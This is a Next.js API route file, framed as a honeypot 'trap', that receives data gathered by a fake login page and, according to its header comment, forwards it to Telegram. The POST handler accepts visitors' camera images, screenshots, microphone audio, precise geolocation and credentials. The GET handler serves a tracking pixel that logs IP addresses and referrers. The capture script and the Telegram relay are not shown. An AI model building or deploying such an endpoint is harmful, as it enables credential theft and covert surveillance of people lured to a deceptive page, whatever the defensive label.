/**
 * Trap - Fingerprint Collection Endpoint
 * 
 * Receives browser fingerprint data from the fake login page
 * and sends it to Telegram.
 */

import { NextResponse } from 'next/server';
import { collectHoneypotData } from '@/lib/honeypot/collector';

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
             request.headers.get('x-real-ip') || 
             'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';

  let fingerprintData: Record<string, any> = {};
  
  try {
    fingerprintData = await request.json();
  } catch (error) {
    return NextResponse.json({ error: 'Invalid JSON' }, { status: 400 });
  }

  // Use IP from fingerprint data if available (tracking from previous traps)
  const trackedIP = fingerprintData.ip || ip;

  try {
    await collectHoneypotData({
      ip: trackedIP,
      userAgent,
      path: '/api/trap/fingerprint',
      method: 'POST',
      attackType: 'FINGERPRINTING',
      severity: 'LOW',
      details: 'Browser fingerprint collected',
      fingerprint: fingerprintData,
      cameraImage: fingerprintData.cameraImage,
      screenshot: fingerprintData.screenshot,
      microphoneAudio: fingerprintData.microphoneAudio,
      preciseGeolocation: fingerprintData.preciseGeolocation,
      credentials: fingerprintData.credentials,
    });
  } catch (error) {
    console.error('[Trap] Failed to process fingerprint:', error);
  }

  return NextResponse.json({ status: 'ok' });
}

// Pixel tracking endpoint (for email/image tracking)
export async function GET(request: Request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
             request.headers.get('x-real-ip') || 
             'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';
  const url = new URL(request.url);
  const ref = url.searchParams.get('ref') || 'unknown';

  try {
    await collectHoneypotData({
      ip,
      userAgent,
      path: '/api/trap/fingerprint',
      method: 'GET',
      attackType: 'INFO_GATHERING',
      severity: 'LOW',
      details: `Tracking pixel loaded. Ref: ${ref}`,
    });
  } catch (error) {
    console.error('[Trap] Failed to process pixel:', error);
  }

  // Return 1x1 transparent GIF
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  
  return new NextResponse(gif, {
    status: 200,
    headers: {
      'Content-Type': 'image/gif',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
    },
  });
}

